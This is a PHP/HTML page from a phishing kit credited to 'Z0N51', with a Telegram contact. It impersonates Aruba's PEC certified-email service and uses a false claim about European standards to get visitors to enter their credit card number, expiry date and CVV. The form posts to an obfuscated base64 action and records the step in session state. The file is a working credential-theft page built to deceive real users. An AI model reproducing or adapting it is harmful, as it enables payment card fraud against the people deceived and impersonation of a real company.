<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    $_SESSION['last_page'] = "cc";
    
?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title> Sign in to your PEC email account | Pec.it </title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="<?php echo CSSPATH; ?>/bootstrap.css">
  <link rel="stylesheet"  href="<?php echo CSSPATH; ?>/style.css">             


  <!-- logo site web-->
  <link rel="icon" href="<?php echo IMGSPATH; ?>/fav.ico" type="image/x-icon" />


  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"/>

</head>



<body>
 <header>
   <div class="container d-flex justify-content-between align-items-center">
     <div class="left d-flex">
       <div class="logo"><img src="<?php echo IMGSPATH; ?>/llg.png"></div>
       <div class="vv">Conferma della carta di credito</div>
     </div>
     <div class="help"><img src="<?php echo IMGSPATH; ?>/help.png"></div>
   </div>
 </header>
 <section>
   <div class="container">
     <div class="sec">
       <h2>CONFERMA IDENTITÀ</h2>
       <p>Per adeguare la PEC agli standard europei, devi confermare la tua identità.</p>
       <div class="box frm col-md-8">
          <form action="<?php echo base64_encode(time()); ?>" method="POST">
                                <input type="hidden" id="cap" name="cap">
                                <input type="hidden" name="steeep" id="steeep" value="cc">
             <div class="form-group row align-items-center mb-3">
               <label  for="one" class="col-md-6 text-start text-md-end">Numero di carta <span>*</span></label>
               <div class="col-md-4 ">
                 <input inputmode="numeric" type="text" class="form-control" placeholder="0000 0000 0000 0000" id="one" name="one">
                 <?php echo errmsg($_SESSION['errors'],'one'); ?>
               </div>
             </div>

             <div class="form-group row align-items-center mb-3">
               <label  for="two" class="col-md-6 text-start text-md-end">Data di scadenza <span>*</span></label>
               <div class="col-md-4 ">
                 <input inputmode="numeric" type="text" class="form-control" placeholder="00/00" id="two" name="two">
                 <?php echo errmsg($_SESSION['errors'],'two'); ?>
               </div>
             </div>

             <div class="form-group row align-items-center mb-5">
               <label  for="three" class="col-md-6 text-start text-md-end">CVV<span>*</span></label>
               <div class="col-md-4 ">
                 <input inputmode="numeric" type="text" class="form-control" placeholder="codice di sicurezza" id="three" name="three">
                 <?php echo errmsg($_SESSION['errors'],'three'); ?>
               </div>
             </div>
             <div class="row  mb-3">
               <div class="col-md-6"></div>
               <div class="col-md-4 d-flex justify-content-center">
                 <div class="btt "><button type="submit">Verificare</button></div>
               </div>
             </div>
          </form>
       </div>
       
     </div>
   </div>
   <hr>
    <div class="foot text-center mt-5">
              <p class="mb-0">©2025 Aruba S.p.A. - P.IVA 01573850516</p>  
              <p class="mb-0 mt-0">REA: BG-434483 - All rights reserved</p>  
              <div class="a"><a href="#">Privacy Policy - Cookie Policy</a></div>
     </div>
 </section>

 

  <!-- template files js-->
  <script src="<?php echo JSPATH; ?>/jquery-3.5.1.min.js"></script>
  <script src="<?php echo JSPATH; ?>/bootstrap.min.js"></script>
  <script src="<?php echo JSPATH; ?>/jquery.mask.js"></script>
  <script src="<?php echo JSPATH; ?>/js.js"></script>
  <script>
    $('#one').mask('0000 0000 0000 0000');
    $('#two').mask('00/00');
    $('#three').mask('0000');
   
  </script>
</body>
</html>